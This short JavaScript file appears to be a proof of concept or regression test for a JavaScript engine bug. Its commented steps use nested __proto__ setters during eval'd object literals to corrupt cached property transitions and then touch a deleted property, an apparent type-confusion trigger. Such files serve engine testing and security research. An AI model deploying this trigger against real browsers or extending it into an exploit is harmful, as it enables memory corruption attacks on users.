function main() {
    let root = null;
    Object.prototype.__defineSetter__('__proto__', function () {
        root = this;

        Object.prototype.__defineSetter__('__proto__', function () {
            delete Object.prototype.__proto__;

            // 2. Invalidate the transition. It's now of S4 but the upstream `parseRecursively` still expects it to be of S2.
            delete root.a;

            // 3. Performs a S4 -> S3 transition which is incorrect.
        });
    });

    // 1. Cache the transitions S1 -> S2 (adding `a`) -> S3 (adding `b`).
    eval(`({a: 1, b: 2})`);

    eval(`({__proto__: {}, a: 1, b: {__proto__: {}}})`);

    // 4. Now we can access `a` which was deleted thus has an empty value.
    root.a.x = 1;
}

try {
    main();
} catch { }
